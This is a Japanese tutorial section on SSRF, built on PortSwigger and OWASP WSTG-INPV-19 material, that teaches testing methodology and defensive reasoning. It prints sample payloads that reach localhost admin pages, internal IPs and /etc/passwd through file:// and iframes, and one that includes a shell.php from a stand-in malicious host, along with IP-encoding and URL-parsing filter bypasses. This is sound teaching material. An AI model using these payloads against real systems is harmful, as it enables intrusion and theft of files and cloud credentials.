## SSRFの定義とテスト方法論（PortSwigger/OWASP）

SSRF（Server-Side Request Forgery、サーバーサイドリクエストフォージェリ）を体系的に学ぶ最初の一歩は、「何が脆弱性なのか」を正確な定義でつかみ、そのうえで「どう見つけるか」というプロの方法論を知ることである。本節ではPortSwigger Web Security Academyの入門記事、OWASPコミュニティページの定義、OWASP Web Security Testing Guide（WSTG）のテスト手順という3つの一次資料を土台に、SSRFのメンタルモデルと影響分類、そして実務でのテスト手順を組み立てる。

### 1. SSRFとは何か — PortSwiggerの定義から

PortSwiggerはSSRFを次のように定義している。

> "Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location."

日本語にすると「攻撃者がサーバーサイドのアプリケーションに、意図しない場所へのリクエストを発行させることを可能にするWebセキュリティ上の脆弱性」である。

> 出典: What is SSRF (Server-side request forgery)? — https://portswigger.net/web-security/ssrf

この定義で押さえるべき核心は、**「攻撃者自身が直接アクセスするのではなく、サーバーという信頼された身元を借りてリクエストを送らせる」**という点である。攻撃者のブラウザやツールから直接ネットワークに到達できない資源（企業の内部ネットワーク、クラウド基盤の管理用エンドポイントなど）であっても、サーバーはそこへの到達性（ネットワーク経路）と、しばしば「ローカル/内部由来だから信頼する」という暗黙の権限を持っている。SSRFはこの「サーバーの立ち位置」を攻撃者が乗っ取る攻撃であり、CSRF（Cross-Site Request Forgery）が「被害者ブラウザの認証済みセッションを借りる」攻撃であるのと対になる構造を持つ。名前の類似は偶然ではなく、「本人になりすまして意図しないリクエストを発行させる」という共通のメンタルモデルを共有している。

#### 1.1 典型的な脆弱コードとリクエスト例

PortSwiggerが挙げる最も基本的な例は、在庫確認機能である。あるショッピングサイトが、複数の店舗の在庫状況を横断的に表示するために、各店舗のシステムへ内部的にリクエストを飛ばす実装を持っているとする。

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

> 出典: What is SSRF (Server-side request forgery)? — https://portswigger.net/web-security/ssrf

このリクエストでは、`stockApi`パラメータの値としてサーバー内部で使う在庫確認APIのURLがそのままクライアントから渡されている。サーバー側の処理は概ね次のようになっている。

```
1. stockApiパラメータの値を読み取る
2. そのURLに対してサーバー自身がHTTPリクエストを送信する
3. レスポンスをクライアントに返す
```

**なぜこれが脆弱なのか。** サーバーは「このURLはアプリケーションが決めた信頼できる値」という前提でリクエストを組み立てているが、実際には`stockApi`の値はクライアント（攻撃者）が完全に制御できる。攻撃者がこの値を別のURL、たとえばサーバー自身のループバックアドレスに書き換えるとどうなるか。

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

> 出典: What is SSRF (Server-side request forgery)? — https://portswigger.net/web-security/ssrf

多くのアプリケーションは、管理画面（`/admin`）へのアクセスを「リクエスト元IPがローカルホスト（127.0.0.1）かどうか」で制御している。これは「外部からは到達できないから安全」という前提に基づく設計だが、SSRFが成立する状況ではこの前提そのものが崩れる。サーバーが自分自身に対してリクエストを送るため、**リクエスト元IPは常にローカルホストになり、IPベースのアクセス制御を素通りしてしまう**。管理画面のレスポンス内容は、脆弱なエンドポイント（`/product/stock`）のレスポンスとしてそのままクライアントに返されるため、攻撃者は外部から一度も`/admin`に直接アクセスすることなく、その内容を閲覧できてしまう。

同様に、内部ネットワーク上の別ホスト（例: `192.168.0.68`）に対してリクエストを送らせることもできる。

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

> 出典: What is SSRF (Server-side request forgery)? — https://portswigger.net/web-security/ssrf

これは「サーバー自身」ではなく「サーバーが到達できる内部ネットワーク上の別システム」を狙うパターンであり、次節で分類する「内部バックエンドシステムに対するSSRF」に相当する。

### 2. なぜSSRFが起きるのか — 信頼境界とパーサの仕組み

SSRFの根本原因を仕組みレベルで理解するには、2つの視点が要る。

**(1) ネットワークの信頼境界とアプリケーションの信頼境界のズレ**

多くのシステムは、ネットワークトポロジー（ファイアウォール、プライベートサブネット、セキュリティグループなど）を境界としてアクセス制御を設計する。「内部ネットワークからのリクエストは信頼する」「ループバックアドレスからのリクエストは管理者自身とみなす」といった設計は、`SSRFが存在しない`世界では合理的である。しかしアプリケーションサーバー自体が「代理人（プロキシ）」として任意の宛先にリクエストを発行できる機能を持っていると、このネットワーク境界は攻撃者にとって透過的になる。攻撃者は物理的・ネットワーク的にその境界の外にいながら、境界の内側にいる主体（サーバー）に指示を出すだけで、境界の内側からのリクエストを生成できてしまう。これがOWASPコミュニティページの言う「サーバー上の機能を悪用して内部リソースにアクセスする」というメカニズムの本質である。

> "SSRF attacks... the attacker can supply or modify a URL which the code running on the server will read or submit data to"

> 出典: Server Side Request Forgery — OWASP Community Pages（https://owasp.org/www-community/attacks/Server_Side_Request_Forgery、実体は https://community.owasp.org/attacks/Server_Side_Request_Forgery にリダイレクト）

**(2) URLパーサ・スキームハンドラの挙動**

もう一つの根本原因は、URL文字列を解釈するパーサの実装差である。HTTPクライアントライブラリは`http://`や`https://`だけでなく、`file://`、`gopher://`、`dict://`など多数のスキームをサポートしていることが多い。アプリケーションが「URLを受け取ってリクエストする」という機能を作るとき、**スキームやホスト部分を制限せずにそのままHTTPクライアントに渡してしまうと、攻撃者は本来Webリクエストを想定していた機能を任意プロトコルのクライアントとして流用できる**。たとえば`file:///etc/passwd`をURLとして渡せば、HTTPリクエストの代わりにローカルファイルシステムからの読み取りが行われる。これは「入力値の型（URL文字列）」と「実際に許可すべき操作範囲（外部HTTPSリクエストのみ）」の間にアプリケーション側が境界線を引いていないために起きる、典型的な**過剰な信頼（over-trust）**の問題である。

### 3. 影響の分類 — OWASPコミュニティページより

OWASPコミュニティページは、SSRFによって引き起こされる影響を次のように整理している（要旨）。

1. **クラウドメタデータの抽出**: AWSなどクラウド環境のインスタンスメタデータサービスは、多くの場合リンクローカルアドレス`169.254.169.254`で内部的に提供されている。サーバーがこのアドレスへのリクエストを（攻撃者の指示で）発行できると、一時認証情報（IAMロールのアクセスキーなど）やインスタンス設定情報が取得され、そのままクラウド基盤全体への侵害につながりうる。
2. **内部サービスへのアクセス**: 認証機構を持たない、あるいは緩い内部専用のデータベース（MongoDBなど）や、外部公開されていない内部REST APIに到達し、データの読み取り・操作が可能になる。
3. **ファイルの読み取り**: `file://`スキームを使い、サーバーのローカルファイルシステム上の機密ファイルを読み取る。
4. **入力検証の回避**: 信頼できない外部データを「サーバー自身が生成したデータ」であるかのように見せかけ、後続処理の検証をすり抜ける。

> 出典: Server Side Request Forgery — OWASP Community Pages（https://owasp.org/www-community/attacks/Server_Side_Request_Forgery）

この分類は「SSRFは何か1つの被害を生む脆弱性ではなく、サーバーが持つネットワーク到達性・特権を丸ごと攻撃者に貸し出す汎用的な足がかりである」ことを示している。特にクラウドメタデータの窃取は、2019年に大規模な情報漏えい事件（大手金融機関がAWS上のWebアプリケーションファイアウォール設定の不備を突かれ、SSRF経由でIAM認証情報を窃取された事案）で広く知られるようになった攻撃パターンであり、現在でもクラウドネイティブなインフラを持つ組織にとって最重要の脅威モデルの一つである。AWSは対策としてIMDSv2（トークンベースのメタデータアクセス、PUTリクエストによるセッショントークン取得を必須化しSSRFでの単純なGETリクエストによる窃取を困難にする方式）を導入しているが、旧来のIMDSv1が有効なままの環境は現在も残っており、対象インフラのバージョン・設定を必ず確認する必要がある。

### 4. SSRFの分類 — サーバー自身 / 内部バックエンド / 外部システム

PortSwiggerの整理に沿うと、SSRFは攻撃対象によって大きく2つ（実務的には3つ）に分けて理解すると見通しが良い。

- **サーバー自身に対するSSRF**: `http://localhost/admin`のように、脆弱なアプリケーションサーバー自身が持つ別の機能（管理画面など）を狙う。ループバックインターフェース経由のアクセスだけを信頼する設計を悪用する。
- **内部バックエンドシステムに対するSSRF**: `http://192.168.0.68/admin`のように、外部から直接到達できないプライベートIPレンジ上の別ホスト・別システムを狙う。組織のネットワークセグメンテーションを飛び越える。
- **外部システムに対するSSRF（あまり一般的でない分類だが実務上重要）**: サーバーに、攻撃者が用意した外部の任意ホストへリクエストを発行させる。SSRFフィルタが「内部IPだけを禁止する」実装になっている場合、この経路がフィルタの穴になることがあり、また後述のOAST（Out-of-Band）を使った検知にも利用される。

### 5. OWASP WSTG-INPV-19 — プロのテスト方法論

OWASP Web Security Testing Guide（WSTG）は、SSRFのテスト項目を`WSTG-INPV-19`として定義している（INPVは「Input Validation Testing」＝入力検証テストのカテゴリ）。ここでの「テスト」とは、単発のペイロードを1つ投げて終わりにするのではなく、**注入点の特定 → 悪用可能性の検証 → 深刻度の評価**という3段階のプロセスとして体系化されている点が重要である。

> "A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE)."

> 出典: WSTG - Testing for Server-Side Request Forgery（WSTG-INPV-19） — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery

#### 5.1 テストの目的（Test Objectives）

WSTGは目的を3点に絞っている。

1. SSRFの注入点（injection points）を特定する
2. その注入点が実際に悪用可能かをテストする
3. 脆弱性の深刻度を評価する

この3段階分けは実務上重要である。「注入点があるらしい」という段階（＝URLらしき値をユーザーが制御できる）と、「実際にサーバーが任意の宛先へリクエストを送っている」ことを確認できた段階、さらに「それがどこまで到達可能で、何を読み取れるか」を評価する段階は、それぞれ必要な検証手法も、報告時に主張できる深刻度も異なる。

#### 5.2 テスト手順（How to Test）

WSTGはまず、次のような一般的なURLパラメータを起点として説明する。

```http
GET https://example.com/page?page=about.php
```

このようにアプリケーションが「読み込むファイル/ページをパラメータで指定する」設計を持つ場合、以下のようなペイロードで段階的に検証する。

**(a) ファイル内容の読み込み（リモートファイルインクルージョン相当）**

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

**(b) 制限されたページへのアクセス**

```http
GET https://example.com/page?page=http://localhost/admin
```

または

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

**なぜループバックアドレスが効くのか。** WSTGは次のように説明している。「ループバックインターフェースを使うことで、ホスト自身にのみ許可されたコンテンツへアクセスする。このメカニズムは、ホストへのアクセス権を持っていれば`admin`ページへ直接アクセスする権限も持っている、という前提に立っている」。つまり設計者は「ループバック＝信頼できる自分自身」という等式を置いているが、SSRFが成立する状況ではサーバー自身がその等式を悪用されるプロキシになってしまう。「リクエスト発生元がローカルマシンかどうかで扱いを変える信頼関係」こそが、SSRFを重大な脆弱性たらしめている根本要因である、とWSTGも明言している。

**(c) ローカルファイルの取得**

```http
GET https://example.com/page?page=file:///etc/passwd
```

これは前述の「スキームハンドラの悪用」に該当する。HTTPリクエストを想定していた機能が、`file://`スキームを受け付けてしまうことでローカルファイル読み取り機に転用される例である。

> 出典: WSTG - Testing for Server-Side Request Forgery（WSTG-INPV-19） — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery

#### 5.3 注入箇所はURLパラメータだけではない

WSTGは、上記のペイロードは**HTTPリクエストの種類を問わず、ヘッダーやCookie値に対しても注入できる**と補足している。SSRFの注入点探索では、クエリパラメータやPOSTボディだけでなく、`Referer`や独自のカスタムヘッダーなど、アプリケーションが「URLらしき値」を受け取って何らかの形でリクエストを構築している箇所すべてを洗い出す必要がある。

#### 5.4 ブラインドSSRFへの言及

WSTGは、POSTリクエストにおけるSSRFは**ブラインド（blind）**な形で現れることがある点にも触れている。アプリケーションがリクエスト結果を即座に画面へ返さない場合、注入したデータはPDFレポート生成、請求書処理、注文処理といった非同期・裏側の処理で使われることがあり、その結果はエンドユーザーには見えず、従業員や社内スタッフ向けの画面にのみ表示されることがある。この場合、通常のレスポンス差分観察だけでは検知できないため、OAST（Out-of-Band Application Security Testing、DNSやHTTPの帯域外通信チャネルを使い、応答が直接返らない箇所でも「自分が制御するサーバーへの着信があったか」を確認する手法）を使った検証が必要になる。ブラインドSSRFの詳細な検知手法は別章で扱う。

> 出典: WSTG - Testing for Server-Side Request Forgery（WSTG-INPV-19） — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery

#### 5.5 PDF生成機能に対するテスト

WSTGは、アップロードされたファイルをサーバー側でPDFに変換する機能がある場合、`<iframe>`、`<img>`、`<base>`、`<script>`要素やCSSの`url()`関数を通じて内部サービスやローカルファイルへの参照を注入できる可能性を指摘している。

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

**なぜこれが成立するのか。** HTML→PDF変換エンジンの多くは、内部的にHTMLレンダリングエンジン（ヘッドレスブラウザに近いもの）を使っており、通常のブラウザと同様に`<iframe>`や`<img>`の`src`属性に指定されたリソースを取得しようとする。この取得処理がサーバー側（変換を実行するマシン）で行われるため、**HTMLインジェクションがSSRFの注入経路そのものになる**。ブラウザ上で完結する通常のXSSとは異なり、この「取得」はサーバーのネットワークコンテキストで発生するため、内部リソースやローカルファイルに到達しうる点が本質的に異なる。

### 6. 共通の防御回避技法（フィルタバイパス）

PortSwigger、OWASPコミュニティページ、WSTGはいずれも、SSRF対策として実装されがちな「ブラックリスト」「ホワイトリスト」フィルタが破られる典型パターンを挙げている。ここでは仕組みレベルで整理する。

#### 6.1 ブラックリスト（`localhost`や`127.0.0.1`の禁止）の回避

多くの実装は文字列としての`localhost`や`127.0.0.1`だけを禁止する。しかしIPv4アドレスには複数の等価な表記が存在する。

- **10進整数表記**: `2130706433`（`127.0.0.1`を32bit値として10進数で表したもの。多くのOS・ライブラリのIPパーサは、ドット区切り表記だけでなく単一の10進整数もIPv4アドレスとして解釈できる）
- **8進数表記**: `017700000001`
- **短縮表記**: `127.1`（IPv4のクラスフルな省略記法で、末尾のみを残し中間の0を省略。多くのパーサは`127.0.0.1`と同一視する）
- **自ドメインを`127.0.0.1`に解決させる**: 攻撃者が管理するDNSレコードを作成し、任意のホスト名（`attacker.example.com`など）が`127.0.0.1`を指すよう設定する。アプリケーション側のフィルタが「ホスト名の文字列」だけを見て「IPアドレスではないから安全」と誤判定する場合に有効。
- **文字列の難読化**: 大文字小文字の変更、URLエンコーディングなどでブロック対象の文字列パターンマッチを回避する。
- **リダイレクトの悪用**: 許可されたドメインへの最初のリクエストがサーバー側の許可チェックを通過した後、レスポンスとして内部URLへの3xxリダイレクトを返し、HTTPクライアントがそれを自動的に追従することでフィルタ適用後に内部URLへ到達する。

これらが機能する共通の理由は、**「文字列としての禁止パターン」と「実際にネットワークスタックが解決・接続するアドレス」の間にズレがある**ことである。フィルタはアプリケーション層の文字列比較で動作するが、実際の接続確立はOSのソケットAPI・DNSリゾルバというまったく別のレイヤーで行われる。この2層の解釈が完全に一致していなければ、フィルタをすり抜けて同じ宛先に到達する経路が必ず残る。

#### 6.2 ホワイトリスト（許可ドメインのみ許容）の回避

ホワイトリストは「特定のドメイン（例: `example.com`）へのリクエストだけを許可する」という設計だが、URLの構文解析（パース）が実装によって異なることを悪用される。

- **`@`によるユーザー情報部の悪用**: `https://expected-domain@attacker-domain`という形式のURLでは、`@`より前は「ユーザー情報（userinfo）」であり、実際に接続されるホストは`@`の後ろの`attacker-domain`である。フィルタが単純な文字列包含チェック（`"expected-domain"が含まれているか`）しか行っていない場合、これは容易に許可を通過する。
- **`#`によるフラグメントの悪用**: `https://attacker-domain#expected-domain`では、`#`以降はURLフラグメント（クライアント側の参照情報で、サーバーには通常送信されない）として扱われる。フィルタが末尾の文字列に`expected-domain`が含まれることだけをチェックしていると、実際の接続先は`attacker-domain`であるにもかかわらず通過してしまう。
- **DNS命名階層の悪用**: `expected-domain.attacker-domain.com`のようなサブドメインを攻撃者が取得・設定し、文字列としては`expected-domain`を含むが実際の名前解決先は攻撃者が完全に制御するドメインである、という状態を作る。
- **URLエンコーディングによる解析コードの混乱**: フィルタとリクエスト実行部で使用するURLパーサの実装・バージョンが異なると、同じ文字列を異なる構造として解釈することがある（パーサ差異攻撃）。

> 出典: What is SSRF (Server-side request forgery)? — https://portswigger.net/web-security/ssrf
> 出典: WSTG - Testing for Server-Side Request Forgery（WSTG-INPV-19） — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery

これらのバイパス手法に共通するのは、**URL仕様（RFC 3986）が持つ「複数の異なる文字列表現が同一のリソースを指しうる」という柔軟性そのものが攻撃対象になっている**ことである。RFC 3986はこの種の曖昧さを「意味的攻撃（semantic attacks）」として言及しており、パーサの実装がRFCの規定通りに動いていても、フィルタ実装者の想定（「文字列の先頭を見ればホストが分かる」等）が誤っていれば回避は成立する。したがって、**防御側は文字列マッチングではなく、実際にHTTPクライアントが解決・接続する最終的な宛先そのものを検証すべき**という結論に至る。この考え方は後続の防御章で扱うアプリケーション層ファイアウォールやDNSリバインディング対策の設計原則の土台になる。

### 7. 深刻度評価とRCEへの発展

WSTGは、SSRFが「時にRCE（Remote Code Execution、リモートコード実行）にまで発展しうる」と明記している。これは、SSRF単体が直接コード実行を引き起こすわけではなく、**到達した先のサービスが持つ別の脆弱性・機能と組み合わさることで**発生する。典型例としては、認証のない内部管理API・RPCエンドポイントへの到達、Redisのような設定コマンドを受け付けるミドルウェアへの到達（後の章で扱うGopherプロトコルを使った任意プロトコルのペイロード送出と組み合わせるケースが代表的）、クラウドメタデータ経由で取得した認証情報を使った管理コンソールへのログイン、などが挙げられる。テストの最終段階である「深刻度の評価」では、単に「内部の何かに到達できた」で終わらせず、**到達先で何が実行可能か・何が読み取れるかまで追跡して初めて正確な深刻度が定まる**という点を覚えておく必要がある。

### 8. まとめと学習パスの位置づけ

本節で確認した内容を整理すると次のようになる。

- SSRFとは、サーバーに攻撃者が意図した宛先へリクエストを発行させる脆弱性であり、根本には「ネットワーク境界とアプリケーション境界のズレ」と「URLパーサ・スキームハンドラの過剰な柔軟性」がある。
- 影響はサーバー自身への到達、内部ネットワークへの到達、クラウドメタデータの窃取、ローカルファイルの読み取りに大別され、いずれも「サーバーの持つ特権をそのまま借用する」という共通原理を持つ。
- OWASP WSTG-INPV-19は「注入点の特定 → 悪用可能性の検証 → 深刻度評価」という3段階のテスト方法論を提示しており、通常のリクエストとブラインドなリクエスト（PDF生成やバックグラウンド処理経由）の両方を検証対象に含める必要がある。
- ブラックリスト・ホワイトリスト双方のフィルタは、文字列比較と実際のネットワーク解決処理のズレを突かれることで回避されうる。

次節以降では、この基礎モデルをもとに、Blind SSRFの検知手法（OASTの実践）、クラウドメタデータサービスへの攻撃、プロトコルスマグリング（Gopher等を使った内部サービスへの任意コマンド送出）、そして本章の締めくくりとしてアプリケーション側で取るべき防御設計（許可リストベースのURL検証、ネットワークレベルの分離）を順に扱っていく。

なお、本節で紹介したペイロードやバイパス技法は、脆弱性の仕組みを理解し、自組織の資産を守るための検査・防御設計に役立てることを目的として解説している。実在する第三者のサービスや本番環境に対して、許可なくこれらの技法を試すことは絶対に行ってはならない。
